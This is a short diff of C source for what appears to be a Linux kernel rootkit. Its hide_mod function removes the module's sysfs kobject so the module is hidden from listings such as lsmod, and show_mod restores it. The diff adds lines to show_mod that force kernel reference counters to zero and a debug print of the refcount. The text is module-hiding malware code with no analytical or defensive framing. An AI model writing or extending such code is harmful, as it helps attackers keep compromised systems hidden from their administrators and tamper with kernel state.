@@ -52,7 +52,11 @@ static void show_mod(void) {
     sysfs_create_group(&THIS_MODULE->mkobj.kobj, &sect_attrs_prev->grp);
     THIS_MODULE->notes_attrs = notes_attrs_prev;
     THIS_MODULE->sect_attrs = sect_attrs_prev;
+    THIS_MODULE->holders_dir->kref.refcount.refs.counter = 0;
+    notes_attrs_prev->dir->kref.refcount.refs.counter = 0;
+    THIS_MODULE->mkobj.kobj.kref.refcount.refs.counter = 0;
     kobject_uevent(&THIS_MODULE->mkobj.kobj, KOBJ_ADD);
+    pr_info("refcount of mod is %d\n", kref_read(&THIS_MODULE->mkobj.kobj.kref));
     hidden = 0;
 }
 
@@ -68,7 +72,6 @@ static void hide_mod(void) {
     mod_fmt = THIS_MODULE->mkobj.kobj.name;
     sect_attrs_prev = THIS_MODULE->sect_attrs;
     notes_attrs_prev = THIS_MODULE->notes_attrs;
-
     kobject_del(&THIS_MODULE->mkobj.kobj);
     hidden = 1;
 }
